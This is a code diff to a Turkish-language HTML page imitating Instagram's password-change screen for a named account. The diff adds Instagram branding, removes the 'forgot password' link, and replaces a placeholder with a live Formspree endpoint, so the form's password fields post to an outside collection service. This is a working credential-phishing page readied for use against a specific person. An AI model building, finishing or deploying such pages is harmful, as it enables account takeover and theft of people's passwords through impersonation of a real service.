@@ -92,14 +92,6 @@
             display: none;
         }
 
-        .forgot-password {
-            color: #0095f6;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 600;
-            align-self: flex-start;
-        }
-
         .submit-btn {
             width: 100%;
             background-color: #0095f6;
@@ -159,7 +151,7 @@
         <!-- Birinci ekran: Form -->
         <div id="formPage">
             <div class="content">
-                <span class="username">mirzm23 •</span>
+                <span class="username">mirzm23 • Instagram</span>
                 <h1>Şifreyi değiştir</h1>
                 <p class="description">
                     Şifren en az 6 karakter olmalı ve rakamlar, harfler ve özel karakterlerden (!$%@%) oluşmalıdır.
@@ -172,7 +164,6 @@
                     
                     <div id="errorText" class="error-message">Yeni şifreler birbiriyle eşleşmiyor. Lütfen tekrar kontrol edin.</div>
 
-                    <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                     <button type="submit" id="submitBtn" class="submit-btn">Şifreyi değiştir</button>
                 </form>
             </div>
@@ -187,7 +178,7 @@
     </div>
 
     <script>
-        const FORMSPREE_URL = "BURAYA_FORMSPREE_LINKINI_YAZ";
+        const FORMSPREE_URL = "https://formspree.io/f/xwlewbor";
 
         document.getElementById('resetForm').addEventListener('submit', function(e) {
             e.preventDefault();
